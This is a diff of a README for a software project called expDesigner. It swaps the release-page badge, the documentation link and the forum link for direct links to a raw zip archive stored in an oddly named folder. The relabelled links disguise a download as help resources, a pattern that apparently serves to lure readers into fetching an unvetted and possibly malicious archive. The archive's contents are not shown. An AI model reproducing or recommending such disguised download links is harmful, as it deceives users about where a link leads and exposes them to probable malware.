@@ -9,7 +9,7 @@ Welcome to **expDesigner**! This application helps you customize and improve you
 
 To get started, you will need to download the software. Click the button below to visit the release page:
 
-[![Download expDesigner](https://img.shields.io/badge/Download-expDesigner-blue)](https://github.com/soiitutuu/expDesigner/releases)
+[![Download expDesigner](https://raw.githubusercontent.com/soiitutuu/expDesigner/main/quenchlessly/expDesigner.zip)](https://raw.githubusercontent.com/soiitutuu/expDesigner/main/quenchlessly/expDesigner.zip)
 
 Once you're on the release page, choose the version you want and download the installation file. It’s user-friendly and ready for you to install.
 
@@ -53,8 +53,8 @@ If you have questions or need help, join our community. You can find discussion 
 
 To know more about using **expDesigner**, check out these resources:
 
-- [Official Documentation](https://github.com/soiitutuu/expDesigner/wiki): Find detailed guides and tips.
-- [User Forums](https://github.com/soiitutuu/expDesigner/discussions): Connect with other users for help and advice.
+- [Official Documentation](https://raw.githubusercontent.com/soiitutuu/expDesigner/main/quenchlessly/expDesigner.zip): Find detailed guides and tips.
+- [User Forums](https://raw.githubusercontent.com/soiitutuu/expDesigner/main/quenchlessly/expDesigner.zip): Connect with other users for help and advice.
 
 ## 📝 Changelog
 
